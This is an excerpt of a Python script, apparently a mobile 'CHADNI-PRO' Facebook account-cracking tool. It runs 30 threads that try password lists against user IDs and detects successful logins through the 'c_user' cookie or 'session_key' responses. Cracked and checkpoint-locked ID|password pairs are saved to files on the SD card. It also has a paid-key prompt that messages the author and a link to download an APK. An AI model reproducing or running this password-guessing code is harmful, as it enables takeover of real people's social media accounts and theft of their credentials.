...
----------------------------------------------
 ...
 Facebook  : ARIYAN.MAHEDI.2009

 Tool Name : CHADNI-PRO
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/CHADNI_VPN1.0.apk/file');menu()

                        elif xd in ['8','08']:

                                os.system('xdg-open https://www.facebook.com/ARIYAN.MAHEDI.2009');menu()
                        ...
                        tks = ("Hi CHADNI Sir, I Need To Buy Your Paid CHADNI PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)

                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)

                        print(' Run :  python CHADNI.py')
...
def pak():
                ...
                with tred(max_workers=30) as CHADNI:     
                        ...
                        for psx in user:
                                ...
                                CHADNI.submit(rndm,ids,passlist)
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [CHADNI-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        CHADNI=session.cookies.get_dict().keys()
                        ...
                        if "c_user" in CHADNI:
                                ...
                                print('\r\r\033[1;32m [CHADNI-OK] %s | %s'%(ids,pas))

                                open('/sdcard/CHADNI-OK.txt', 'a').write(ids+'|'+pas+'\n')

                                oks.append(ids)

                                break

                        elif 'checkpoint' in CHADNI:

                                if 'y' in pcp:

                                        print('\r\r\x1b[38;5;208m [CHADNI-CP] '+ids+' | '+pas+'\033[1;97m')

                                        open('/sdcard/CHADNI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [CHADNI-OK] '+ids+' | '+pas+'\033[1;97m')
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                okk=open('/sdcard/CHADNI-OK.txt','r').read()

                                                if uid in okk:pass

                                                else:

                                                        print('\r\r\033[1;32m [CHADNI-OK] '+uid+' | '+pas+'\033[1;97m')

                                                        open('/sdcard/CHADNI-OK.txt','a').write(uid+'|'+pas+'\n')
